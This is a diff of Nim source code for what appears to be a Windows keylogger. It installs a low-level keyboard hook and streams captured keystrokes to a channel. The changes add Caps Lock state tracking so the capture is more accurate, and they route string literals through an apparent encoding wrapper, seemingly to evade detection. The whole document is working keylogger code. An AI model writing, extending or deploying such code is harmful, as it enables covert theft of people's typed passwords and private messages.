@@ -1,5 +1,4 @@
-from tables import `[]`
-from tables import toTable
+from bitops import bitand
 
 from os import sleep
 
@@ -8,7 +7,6 @@ from winim/inc/windef import LPARAM
 from winim/inc/windef import LRESULT
 from winim/inc/windef import DWORD
 from winim/inc/windef import HHOOK
-
 
 from winim/inc/winuser import PKBDLLHOOKSTRUCT
 from winim/inc/winuser import KBDLLHOOKSTRUCT
@@ -35,6 +33,7 @@ from winim/inc/winuser import WH_KEYBOARD_LL
 from winim/inc/winuser import HOOKPROC
 from winim/inc/winuser import MSG
 from winim/inc/winuser import GetMessage
+from winim/inc/winuser import GetKeyState
 
 from winim/utils import winimConverterBOOLToBoolean
 
@@ -61,15 +60,24 @@ proc processDataThread(): void {.thread.} =
       let keyText: string = $key
 
       if wparam == WM_KEYDOWN or wparam == WM_SYSKEYDOWN:
-        mainChannel.send (d e "k", keyText)
+        var prefix: string = ""
+
+        if key == VK_CAPITAL:
+          if (bitand(GetKeyState(VK_CAPITAL), 0x0001)) != 0:
+            prefix = d e "+"
+          else:
+            prefix = d e "-"
+
+        mainChannel.send (d e "k", prefix & keyText)
 
       elif wparam == WM_KEYUP or wparam == WM_SYSKEYUP:
         if key == VK_CONTROL or key == VK_LCONTROL or key == VK_RCONTROL or # ctrl
           key == VK_SHIFT or key == VK_RSHIFT or key == VK_LSHIFT or # shift
           key == VK_MENU or key == VK_LMENU or key == VK_RMENU or # alt
           key == VK_LWIN or key == VK_RWIN: # win
-
-          mainChannel.send (d e "k", "<" & keyText) # insert like [SHIFT] [a] [b] <[SHIFT]
+          
+          # insert like [SHIFT] [a] [b] <[SHIFT]
+          mainChannel.send (d e "k", d(e("<")) & keyText)
 
     sleep(10)
 
